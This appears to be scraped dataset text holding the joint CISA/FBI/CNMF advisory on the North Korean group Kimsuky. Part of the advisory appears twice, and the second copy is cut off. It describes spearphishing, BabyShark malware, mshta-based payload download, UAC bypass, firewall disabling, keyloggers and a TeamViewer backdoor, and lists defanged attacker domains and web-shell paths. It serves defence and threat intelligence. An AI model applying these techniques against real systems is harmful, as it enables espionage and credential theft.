CISA Emergency Services Sector Continuity Planning Suite 
CISA MS-ISAC Joint Ransomware Guide
CISA Tip: Avoiding Social Engineering and Phishing Attacks
FBI PSA: “High-Impact Ransomware Attacks Threaten U.S. Businesses and Organizations""
Health Industry Cybersecurity Tactical Crisis Response
Health Industry Cybersecurity Practices (HICP) 
HHS - Ransomware Spotlight Webinar 
HHS - Health Industry Cybersecurity Practices: Managing Threats and Protecting Patients
HHS - Ransomware Briefing 
HHS - Aggressive Ransomware Impacts
HHS - Ransomware Fact Sheet
HHS - Cyber Attack Checklist
HHS - Cyber-Attack Response Infographic
NIST - Data Integrity Publication
NIST - Guide for Cybersecurity Event Recovery
NIST - Identifying and Protecting Assets Against Ransomware and Other Destructive Events 
NIST - Detecting and Responding to Ransomware and Other Destructive Events 
NIST - Recovering from Ransomware and Other Destructive Events 
Github List of IOCs

Revisions

October 28, 2020: Initial version|October 29, 2020: Updated to include information on Conti, TrickBot, and BazarLoader, including new IOCs and Yara Rules for detection|November 2, 2020: Updated FBI link






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-302a
71,"




Summary

This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) version 7 framework. See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques.
This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the U.S. Cyber Command Cyber National Mission Force (CNMF). This advisory describes the tactics, techniques, and procedures (TTPs) used by North Korean advanced persistent threat (APT) group Kimsuky—against worldwide targets—to gain intelligence on various topics of interest to the North Korean government. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.cisa.gov/northkorea.
This advisory describes known Kimsuky TTPs, as found in open-source and intelligence reporting through July 2020. The target audience for this advisory is commercial sector businesses desiring to protect their networks from North Korean APT activity.
Click here for a PDF version of this report.
Key Findings
This advisory’s key findings are:

The Kimsuky APT group has most likely been operating since 2012.
Kimsuky is most likely tasked by the North Korean regime with a global intelligence gathering mission.
Kimsuky employs common social engineering tactics, spearphishing, and watering hole attacks to exfiltrate desired information from victims.[1],[2]
Kimsuky is most likely to use spearphishing to gain initial access into victim hosts or networks.[3]
Kimsuky conducts its intelligence collection activities against individuals and organizations in South Korea, Japan, and the United States.
Kimsuky focuses its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.
Kimsuky specifically targets:


Individuals identified as experts in various fields,
Think tanks, and
South Korean government entities.[4],[5],[6],[7],[8]


CISA, FBI, and CNMF recommend individuals and organizations within this target profile increase their defenses and adopt a heightened state of awareness. Particularly important mitigations include safeguards against spearphishing, use of multi-factor authentication, and user awareness training.


Technical Details

Initial Access
Kimsuky uses various spearphishing and social engineering methods to obtain Initial Access [TA0001] to victim networks.[9],[10],[11] Spearphishing—with a malicious attachment embedded in the email—is the most observed Kimsuky tactic (Phishing: Spearphishing Attachment [T1566.001]).[12],[13]

The APT group has used web hosting credentials—stolen from victims outside of their usual targets—to host their malicious scripts and tools. Kimsuky likely obtained the credentials from the victims via spearphishing and credential harvesting scripts. On the victim domains, they have created subdomains mimicking legitimate sites and services they are spoofing, such as Google or Yahoo mail.[14]
Kimsuky has also sent benign emails to targets, which were possibly intended to build trust in advance of a follow-on email with a malicious attachment or link.

Posing as South Korean reporters, Kimsuky exchanged several benign interview-themed emails with their intended target to ostensibly arrange an interview date and possibly build rapport. The emails contained the subject line “Skype Interview requests of [Redacted TV Show] in Seoul,” and began with a request to have the recipient appear as a guest on the show. The APT group invited the targets to a Skype interview on the topic of inter-Korean issues and denuclearization negotiations on the Korean Peninsula.
After a recipient agreed to an interview, Kimsuky sent a subsequent email with a malicious document, either as an attachment or as a Google Drive link within the body. The document usually contained a variant of BabyShark malware (see the Execution section for information on BabyShark). When the date of the interview drew near, Kimsuky sent an email canceling the interview.


Kimsuky tailors its spearphishing and social engineering approaches to use topics relevant to the target, such as COVID-19, the North Korean nuclear program, or media interviews.[15],[16],[17]

Kimsuky’s other methods for obtaining initial access include login-security-alert-themed phishing emails, watering hole attacks, distributing malware through torrent sharing sites, and directing victims to install malicious browser extensions (Phishing: Spearphising Link [T1566.002], Drive-by Compromise [T1189], Man-in-the-Browser [T1185]).[18]
Execution
After obtaining initial access, Kimsuky uses BabyShark malware and PowerShell or the Windows Command Shell for Execution [TA0002].

BabyShark is Visual Basic Script (VBS)-based malware.

First, the compromised host system uses the native Microsoft Windows utility, mshta.exe, to download and execute an HTML application (HTA) file from a remote system (Signed Binary Proxy Execution: Mshta [T1218.005]).
The HTA file then downloads, decodes, and executes the encoded BabyShark VBS file.
The script maintains Persistence [TA0003] by creating a Registry key that runs on startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]).
 It then collects system information (System Information Discovery [T1082]), sends it to the operator’s command control (C2) servers, and awaits further commands.[19],[20],[21],[22]


Open-source reporting indicates BabyShark is delivered via an email message containing a link or an attachment (see Initial Access section for more information) (Phishing: Spearphising Link [T1566.002], Phishing: Spearphishing Attachment [T1566.001]). Kimsuky tailors email phishing messages to match its targets’ interests. Observed targets have been U.S. think tanks and the global cryptocurrency industry.[23]
Kimsuky uses PowerShell to run executables from the internet without touching the physical hard disk on a computer by using the target’s memory (Command and Scripting Interpreter: PowerShell [T1059.001]). PowerShell commands/scripts can be executed without invoking powershell.exe through HTA files or mshta.exe.[24],[25],[26],[27]

Persistence
Kimsuky has demonstrated the ability to establish Persistence [TA0003] through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application. By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.

In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser [T1185]). The extension’s reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative. The reviews were likely left by compromised Google+ accounts.[28]
Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution [T1547]). The service name may be disguised with the name from a related operating system function or by masquerading as benign software. Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System. They can also directly start services through Service Execution.[29],[30]
During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware. GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol [T1021.001]).[31]
Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwp files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]). Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor). The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.[32] Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.[33]
Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells; these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell [T1505.003]). The actor often adds “Dinosaur” references within the modified web shell codes.[34]

Privilege Escalation
Kimsuky uses well-known methods for Privilege Escalation [TA0004]. These methods include placing scripts in the Startup folder, creating and running new services, changing default file associations, and injecting malicious code in explorer.exe.

Kimsuky has used Win7Elevate—an exploit from the Metasploit framework—to bypass the User Account Control to inject malicious code into explorer.exe (Process Injection [T1055]). This malicious code decrypts its spying library—a collection of keystroke logging and remote control access tools and remote control download and execution tools—from resources, regardless of the victim’s operating system. It then saves the decrypted file to a disk with a random but hardcoded name (e.g., dfe8b437dd7c417a6d.tmp) in the user’s temporary folder and loads this file as a library, ensuring the tools are then on the system even after a reboot. This allows for the escalation of privileges.[35]
Before the injection takes place, the malware sets the necessary privileges (see figure 1). The malware writes the path to its malicious Dynamic Link Library (DLL) and ensures the remote process is loaded by creating a remote thread within explorer.exe (Process Injection [T1055]).[36]


Figure 1: Privileges set for the injection [37]
Defense Evasion
Kimsuky uses well-known and widely available methods for Defense Evasion [TA0005] within a network. These methods include disabling security tools, deleting files, and using Metasploit.[38],[39]

Kimsuky’s malicious DLL runs at startup to zero (i.e., turn off) the Windows firewall Registry keys (see figure 2). This disables the Windows system firewall and turns off the Windows Security Center service, which prevents the service from alerting the user about the disabled firewall (see figure 2) (Impair Defenses: Disable or Modify System Firewall [T1562.004]).[40]


Figure 2: Disabled firewall values in the Registry [41]

Kimsuky has used a keylogger that deletes exfiltrated data on disk after it is transmitted to its C2 server (Indicator Removal on Host: File Deletion [T1070.004]).[42]
Kimsuky has used mshta.exe, which is a utility that executes Microsoft HTAs. It can be used for proxy execution of malicious .hta files and JavaScript or VBS through a trusted windows utility (Signed Binary Proxy Execution: Mshta [T1218.005]). It can also be used to bypass application allow listing solutions (Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]).[43],[44]
Win7Elevate—which was noted above—is also used to evade traditional security measures. Win7Elevatve is a part of the Metasploit framework open-source code and is used to inject malicious code into explorer.exe (Process Injection [T1055]). The malicious code decrypts its spying library from resources, saves the decrypted file to disk with a random but hardcoded name in the victim's temporary folder, and loads the file as a library.[45],[46],[47]

Credential Access
Kimsuky uses legitimate tools and network sniffers to harvest credentials from web browsers, files, and keyloggers (Credential Access [TA0006]). 

Kimsuky uses memory dump programs instead of using well-known malicious software and performs the credential extraction offline. Kimsuky uses ProcDump, a Windows command line administration tool, also available for Linux, that allows a user to create crash dumps/core dumps of processes based upon certain criteria, such as high central processing unit (CPU) utilization (OS Credential Dumping [T1003]). ProcDump monitors for CPU spikes and generates a crash dump when a value is met; it passes information to a Word document saved on the computer. It can be used as a general process dump utility that actors can embed in other scripts, as seen by Kimsuky’s inclusion of ProcDump in the BabyShark malware.[48]
According to open-source security researchers, Kimsuky abuses a Chrome extension to steal passwords and cookies from browsers (Man-in-the-Browser [T1185]).[49],[50] The spearphishing email directs a victim to a phishing site, where the victim is shown a benign PDF document but is not able to view it. The victim is then redirected to the official Chrome Web Store page to install a Chrome extension, which has the ability to steal cookies and site passwords and loads a JavaScript file, named jQuery.js, from a separate site (see figure 3).[51]


Figure 3: JavaScript file, named jQuery.js [52]

Kimsuky also uses a PowerShell based keylogger, named MECHANICAL, and a network sniffing tool, named Nirsoft SniffPass (Input Capture: Keylogging [T1056.001], Network Sniffing [T1040]). MECHANICAL logs keystrokes to %userprofile%\appdata\roaming\apach.{txt,log} and is also a ""cryptojacker,"" which is a tool that uses a victim’s computer to mine cryptocurrency. Nirsoft SniffPass is capable of obtaining passwords sent over non-secure protocols.[53]
Kimsuky used actor-modified versions of PHProxy, an open-source web proxy written in PHP, to examine web traffic between the victim and the website accessed by the victims and to collect any credentials entered by the victim.[54]

Discovery
Kimsuky enumerates system information and the file structure for victims’ computers and networks (Discovery [TA0007]). Kimsuky appears to rely on using the victim’s operating system command prompt to enumerate the file structure and system information (File and Directory Discovery [T1083]). The information is directed to C:\WINDOWS\msdatl3.inc, read by malware, and likely emailed to the malware’s command server.[55]
Collection
Kimsuky collects data from the victim system through its HWP document malware and its keylogger (Collection [TA0009]). The HWP document malware changes the default program association in the Registry to open HWP documents (Event Triggered Execution: Change Default File Association [T1546.001]). When a user opens an HWP file, the Registry key change triggers the execution of malware that opens the HWP document and then sends a copy of the HWP document to an account under the adversary’s control. The malware then allows the user to open the file as normal without any indication to the user that anything has occurred. The keylogger intercepts keystrokes and writes them to C:\Program Files\Common Files\System\Ole DB\msolui80.inc and records the active window name where the user pressed keys (Input Capture: Keylogging [T1056.001]). There is another keylogger variant that logs keystrokes into C:\WINDOWS\setup.log.[56]
Kimsuky has also used a Mac OS Python implant that gathers data from Mac OS systems and sends it to a C2 server (Command and Scripting Interpreter: Python [T1059.006]). The Python program downloads various implants based on C2 options specified after the filedown.php (see figure 4).


Figure 4: Python Script targeting MacOS [57]
Command and Control
Kimsuky has used a modified TeamViewer client, version 5.0.9104, for Command and Control [TA0011] (Remote Access Software [T1219]). During the initial infection, the service “Remote Access Service” is created and adjusted to execute C:\Windows\System32\vcmon.exe at system startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]). Every time vcmon.exe is executed, it disables the firewall by zeroing out Registry values (Impair Defenses: Disable or Modify System Firewall [T1562.004]). The program then modifies the TeamViewer Registry settings by changing the TeamViewer strings in TeamViewer components. The launcher then configures several Registry values, including SecurityPasswordAES, that control how the remote access tool will work. The SecurityPasswordAES Registry value represents a hash of the password used by a remote user to connect to TeamViewer Client (Use Alternate Authentication Material: Pass the Hash [T1550.002]). This way, the attackers set a pre-shared authentication value to have access to the TeamViewer Client. The attacker will then execute the TeamViewer client netsvcs.exe.[58]
Kimsuky has been using a consistent format. In the URL used recently—express[.]php?op=1—there appears to be an option range from 1 to 3.[59]
Exfiltration
Open-source reporting from cybersecurity companies describes two different methods Kimsuky has used to exfiltrate stolen data: via email or through an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer (Exfiltration [TA0010]).
There was no indication that the actor destroyed computers during the observed exfiltrations, suggesting Kimsuky’s intention is to steal information, not to disrupt computer networks. Kimsuky’s preferred method for sending or receiving exfiltrated information is through email, with their malware on the victim machine encrypting the data before sending it to a C2 server (Archive Collected Data [T1560]).  Kimsuky also sets up auto-forward rules within a victim’s email account (Email Collection: Email Forwarding Rule [T1114.003]).
Kimsuky also uses an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer to exfiltrate stolen data. The data is sent RSA-encrypted (Encrypted Channel: Symmetric Cryptography [T1573.001]). Kimsuky’s malware constructs an 1120-bit public key and uses it to encrypt the 117-bytes buffer. The resulting data file is saved in C:\Program Files\Common Files\System\Ole DB\ (Data Staged: Local Data Staging [T1074.001]).[60]

Mitigations

Indicators of Compromise
Kimsuky has used the domains listed in table 1 to carry out its objectives:
For a downloadable copy of IOCs, see AA20-301A.stix.
Table 1: Domains used by Kimsuky




login.bignaver[.]com


nytimes.onekma[.]com


webuserinfo[.]com




member.navier.pe[.]hu


nid.naver.onektx[.]com


pro-navor[.]com




cloudnaver[.]com


read.tongilmoney[.]com


naver[.]pw




resetprofile[.]com


nid.naver.unicrefia[.]com


daurn[.]org




servicenidnaver[.]com


mail.unifsc[[.]com 


naver.com[.]de




account.daurn.pe[.]hu


member.daum.unikortv[.]com 


ns.onekorea[.]me




login.daum.unikortv[.]com 


securetymail[.]com


riaver[.]site




account.daum.unikortv[.]com 


help-navers[.]com


mailsnaver[.]com




daum.unikortv[.]com


beyondparallel.sslport[.]work


cloudmail[.]cloud



member.daum.uniex[.]kr

comment.poulsen[.]work


helpnaver[.]com




jonga[.]ml


impression.poulsen[.]work


view-naver[.]com




myaccounts.gmail.kr-infos[.]com


statement.poulsen[.]work


view-hanmail[.]net




naver.hol[.]es


demand.poulsen[.]work


login.daum.net-accounts[.]info




dept-dr.lab.hol[.]es


sankei.sslport[.]work


read-hanmail[.]net




Daurn.pe[.]hu


sts.desk-top[.]work


net.tm[.]ro




Bigfile.pe[.]hu


hogy.desk-top[.]work


daum.net[.]pl




Cdaum.pe[.]hu


kooo[.]gq 


usernaver[.]com




eastsea.or[.]kr


tiosuaking[.]com


naver.com[.]ec




myaccount.nkaac[.]net


help.unikoreas[.]kr


naver.com[.]mx




naver.koreagov[.]com


resultview[.]com


naver.com[.]se




naver.onegov[.]com


account.daum.unikftc[.]kr


naver.com[.]cm




member-authorize[.]com


ww-naver[.]com


nid.naver.com[.]se




naver.unibok[.]kr


vilene.desk-top[.]work


csnaver[.]com




nid.naver.unibok[.]kr


amberalexander.ghtdev[.]com


nidnaver[.]email




read-naver[.]com


nidnaver[.]net


cooper[.]center




dubai-1[.]com


coinone.co[.]in


nidlogin.naver.corper[.]be




amberalexander.ghtdev[.]com


naver.com[.]pl


nid.naver.corper[.]be




gloole[.]net


naver[.]cx


naverdns[.]co




smtper[.]org


smtper[.]cz


naver.co[.]in




login.daum.kcrct[.]ml


myetherwallet.com[.]mx


downloadman06[.]com




login.outlook.kcrct[.]ml


myetherwallet.co[.]in 


loadmanager07[.]com




top.naver.onekda[.]com


com-download[.]work


com-option[.]work




com-sslnet[.]work


com-vps[.]work


com-ssl[.]work




desk-top[.]work


intemet[.]work


jp-ssl[.]work




org-vip[.]work


sslport[.]work


sslserver[.]work




ssltop[.]work


taplist[.]work


vpstop[.]work




webmain[.]work


preview.manage.org-view[.]work


intranet.ohchr.account-protect[.]work




 
Table 2: Redacted domains used by Kimsuky




[REDACTED]/home/dwn[.]php?van=101


[REDACTED]/home/dwn[.]php?v%20an=101


[REDACTED]/home/dwn[.]php?van=102




[REDACTED]/home/up[.]php?id=NQDPDE


[REDACTED]/test/Update[.]php?wShell=201


 





Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
 
DISCLAIMER
 

This information is provided ""as is"" for informational purposes only. The United States Government does not provide any warranties of any kind regarding this information. In no event shall the United States Government or its contractors or subcontractors be liable for any damages, including but not limited to, direct, indirect, special or consequential damages, arising out of, resulting from, or in any way connected with this information, whether or not based upon warranty, contract, tort, or otherwise, whether or not arising out of negligence, and whether or not injury was sustained from, or arose out of the results of, or reliance upon the information.
The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.


References

[1] Netscout: Stolen Pencil Campaign Targets Academia 
[2] CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries
[3] CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries
[4] Netscout: Stolen Pencil Campaign Targets Academia 
[5] MITRE ATT&CK: Groups – Kimsuky
[6] Securityweek.com: North Korean Suspected Cyber-espionage Attacks Against South Korea Entities
[7] MITRE ATT&CK: Groups – Kimsuky
[8] CrowdStrike: 2020 Global Threat Report
[9] Malwarebytes: APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure
[10] PwC: Tracking ‘Kimsuky’, the North Korea-based cyber espionage group: Part 2
[11] CrowdStrike: 2020 Global Threat Report
[12] Netscout: Stolen Pencil Campaign Targets Academia 
[13] MITRE ATT&CK: Groups – Kimsuky
"">[14] Private Sector Partner
[15] CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries
[16] Malwarebytes: APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure
[17] cyberscoop: North Korea could accelerate commercial espionage to meet Kim’s economic deadline 
[18] MITRE ATT&CK: Groups – Kimsuky
[19] CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries
[20] MITRE ATT&CK: Groups – Kimsuky
[21] Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks
[22] Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks
[23] CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries
[24] MITRE ATT&CK: Groups – Kimsuky
[25] Palo Alto Networks Unit 42: BabyShark Malware Part Two – Attacks Continue Using KimJongRAT and PCRat 
[26] McAfee: What is mshta, how can it be used and how to protect against it
[27] Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks
[28] Netscout: Stolen Pencil Campaign Targets Academia
[29] MITRE ATT&CK: Groups – Kimsuky
[30] Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks
[31] Netscout: Stolen Pencil Campaign Targets Academia 
[32] Securelist: The “Kimsuky” Operation: A North Korean APT?
"">[33] Private Sector Partner
"">[34] Private Sector Partner
[35] Securelist: The “Kimsuky” Operation: A North Korean APT?
[36] Yoroi: The North Korean Kimsuky APT Keeps Threatening South Korea Evolving its TTPs
[37] Yoroi: The North Korean Kimsuky APT Keeps Threatening South Korea Evolving its TTPs
[38] Securelist: The “Kimsuky” Operation: A North Korean APT?
[39] MITRE ATT&CK: Groups – Kimsuky
[40] Securelist: The “Kimsuky” Operation: A North Korean APT?
[41] Securelist: The “Kimsuky” Operation: A North Korean APT?
[42] Securelist: The “Kimsuky” Operation: A North Korean APT?
[43] MITRE ATT&CK: Groups – Kimsuky
[44] McAfee: What is mshta, how can it be used and how to protect against it
[45] Securityweek.com: North Korean Suspected Cyber-espionage Attacks Against South Korea Entities
[46] Securelist: The “Kimsuky” Operation: A North Korean APT?
[47] MITRE ATT&CK: Groups – Kimsuky
[48] Detecting credential theft through memory access modelling with Microsoft Defender ATP
[49] MITRE ATT&CK: Groups – Kimsuky
[50] ZDNet: Cyber-espionage-group-uses-chrome-extension-to-infect-victims
[51] ZDNet: Cyber-espionage-group-uses-chrome-extension-to-infect-victims
[52] Netscout: Stolen Pencil Campaign Targets Academia 
[53] Netscout: Stolen Pencil Campaign Targets Academia 
"">[54] Private Sector Partner
[55] Securelist: The “Kimsuky” Operation: A North Korean APT? 
[56] Securelist: The “Kimsuky” Operation: A North Korean APT? 
"">[57] Private Sector Partner
[58] Securelist: The “Kimsuky” Operation: A North Korean APT? 
"">[59] Private Sector Partner
[60] Securelist: The “Kimsuky” Operation: A North Korean APT? 

Revisions

October 27, 2020: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'T1083', 'T1566.002', 'T1505.003', 'T1219', 'TA0010', 'TA0005', 'T1040', 'T1560', 'T1573.001', 'TA0006', 'T1074.001', 'T1082', 'T1114.003', 'T1218.005', 'TA0011', 'T1550.002', 'T1059.006', 'T1547', 'T1070.004', 'T1003', 'T1056.001', 'TA0001', 'T1566.001', 'TA0002', 'T1059.001', 'T1547.001', 'TA0009', 'T1189', 'T1021.001', 'TA0004', 'T1185', 'T1055', 'T1546.001', 'TA0007', 'T1548.002', 'T1562.004'}","




Summary

This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) version 7 framework. See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques.
This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the U.S. Cyber Command Cyber National Mission Force (CNMF). This advisory describes the tactics, techniques, and procedures (TTPs) used by North Korean advanced persistent threat (APT) group Kimsuky—against worldwide targets—to gain intelligence on various topics of interest to the North Korean government. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.cisa.gov/northkorea.
This advisory describes known Kimsuky TTPs, as found in open-source and intelligence reporting through July 2020. The target audience for this advisory is commercial sector businesses desiring to protect their networks from North Korean APT activity.
Click here for a PDF version of this report.
Key Findings
This advisory’s key findings are:

The Kimsuky APT group has most likely been operating since 2012.
Kimsuky is most likely tasked by the North Korean regime with a global intelligence gathering mission.
Kimsuky employs common social engineering tactics, spearphishing, and watering hole attacks to exfiltrate desired information from victims.,1,2,
Kimsuky is most likely to use spearphishing to gain initial access into victim hosts or networks.,3,
Kimsuky conducts its intelligence collection activities against individuals and organizations in South Korea, Japan, and the United States.
Kimsuky focuses its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.
Kimsuky specifically targets:


Individuals identified as experts in various fields,
Think tanks, and
South Korean government entities.,4,5,6,7,8,


CISA, FBI, and CNMF recommend individuals and organizations within this target profile increase their defenses and adopt a heightened state of awareness. Particularly important mitigations include safeguards against spearphishing, use of multi-factor authentication, and user awareness training.


Technical Details

Initial Access
Kimsuky uses various spearphishing and social engineering methods to obtain Initial Access, to victim networks.,9,10,11, Spearphishing—with a malicious attachment embedded in the email—is the most observed Kimsuky tactic (Phishing: Spearphishing Attachment,).,12,13,

The APT group has used web hosting credentials—stolen from victims outside of their usual targets—to host their malicious scripts and tools. Kimsuky likely obtained the credentials from the victims via spearphishing and credential harvesting scripts. On the victim domains, they have created subdomains mimicking legitimate sites and services they are spoofing, such as Google or Yahoo mail.,14,
Kimsuky has also sent benign emails to targets, which were possibly intended to build trust in advance of a follow-on email with a malicious attachment or link.

Posing as South Korean reporters, Kimsuky exchanged several benign interview-themed emails with their intended target to ostensibly arrange an interview date and possibly build rapport. The emails contained the subject line “Skype Interview requests of,Redacted TV Show, in Seoul,” and began with a request to have the recipient appear as a guest on the show. The APT group invited the targets to a Skype interview on the topic of inter-Korean issues and denuclearization negotiations on the Korean Peninsula.
After a recipient agreed to an interview, Kimsuky sent a subsequent email with a malicious document, either as an attachment or as a Google Drive link within the body. The document usually contained a variant of BabyShark malware (see the Execution section for information on BabyShark). When the date of the interview drew near, Kimsuky sent an email canceling the interview.


Kimsuky tailors its spearphishing and social engineering approaches to use topics relevant to the target, such as COVID-19, the North Korean nuclear program, or media interviews.,15,16,17,

Kimsuky’s other methods for obtaining initial access include login-security-alert-themed phishing emails, watering hole attacks, distributing malware through torrent sharing sites, and directing victims to install malicious browser extensions (Phishing: Spearphising Link, Drive-by Compromise, Man-in-the-Browser,).,18,
Execution
After obtaining initial access, Kimsuky uses BabyShark malware and PowerShell or the Windows Command Shell for Execution,.

BabyShark is Visual Basic Script (VBS)-based malware.

First, the compromised host system uses the native Microsoft Windows utility, mshta.exe, to download and execute an HTML application (HTA) file from a remote system (Signed Binary Proxy Execution: Mshta,).
The HTA file then downloads, decodes, and executes the encoded BabyShark VBS file.
The script maintains Persistence, by creating a Registry key that runs on startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,).
 It then collects system information (System Information Discovery,), sends it to the operator’s command control (C2) servers, and awaits further commands.,19,20,21,22,


Open-source reporting indicates BabyShark is delivered via an email message containing a link or an attachment (see Initial Access section for more information) (Phishing: Spearphising Link, Phishing: Spearphishing Attachment,). Kimsuky tailors email phishing messages to match its targets’ interests. Observed targets have been U.S. think tanks and the global cryptocurrency industry.,23,
Kimsuky uses PowerShell to run executables from the internet without touching the physical hard disk on a computer by using the target’s memory (Command and Scripting Interpreter: PowerShell,). PowerShell commands/scripts can be executed without invoking powershell.exe through HTA files or mshta.exe.,24,25,26,27,

Persistence
Kimsuky has demonstrated the ability to establish Persistence, through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application. By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions.

In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser,). The extension’s reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative. The reviews were likely left by compromised Google+ accounts.,28,
Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution,). The service name may be disguised with the name from a related operating system function or by masquerading as benign software. Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System. They can also directly start services through Service Execution.,29,30,
During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware. GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol,).,31,
Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwp files) in the Registry (Event Triggered Execution: Change Default File Association,). Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor). The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.,32, Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.,33,
Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells; these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell,). The actor often adds “Dinosaur” references within the modified web shell codes.,34,

Privilege Escalation
Kimsuky uses well-known methods for Privilege Escalation,. These methods include placing scripts in the Startup folder, creating and running new services, changing default file associations, and injecting malicious code in explorer.exe.

Kimsuky has used Win7Elevate—an exploit from the Metasploit framework—to bypass the User Account Control to inject malicious code into explorer.exe (Process Injection,). This malicious code decrypts its spying library—a collection of keystroke logging and remote control access tools and remote control download and execution tools—from resources, regardless of the victim’s operating system. It then saves the decrypted file to a disk with a random but hardcoded name (e.g., dfe8b437dd7c417a6d.tmp) in the user’s temporary folder and loads this file as a library, ensuring the tools are then on the system even after a reboot. This allows for the escalation of privileges.,35,
Before the injection takes place, the malware sets the necessary privileges (see figure 1). The malware writes the path to its malicious Dynamic Link Library (DLL) and ensures the remote process is loaded by creating a remote thread within explorer.exe (Process Injection,).,36,


Figure 1: Privileges set for the injection,37,
Defense Evasion
Kimsuky uses well-known and widely available methods for Defense Evasion, within a network. These methods include disabling security tools, deleting files, and using Metasploit.,38,39,

Kimsuky’s malicious DLL runs at startup to zero (i.e., turn off) the Windows firewall Registry keys (see figure 2). This disables the Windows system firewall and turns off the Windows Security Center service, which prevents the service from alerting the user about the disabled firewall (see figure 2) (Impair Defenses: Disable or Modify System Firewall,).,40,


Figure 2: Disabled firewall values in the Registry,41,

Kimsuky has used a keylogger that deletes exfiltrated data on disk after it is transmitted to its C2 server (Indicator Removal on Host: File Deletion,).,42,
Kimsuky has used mshta.exe, which is a utility that executes Microsoft HTAs. It can be used for proxy execution of malicious .hta files and JavaScript or VBS through a trusted windows utility (Signed Binary Proxy Execution: Mshta,). It can also be used to bypass application allow listing solutions (Abuse Elevation Control Mechanism: Bypass User Access Control,).,43,44,
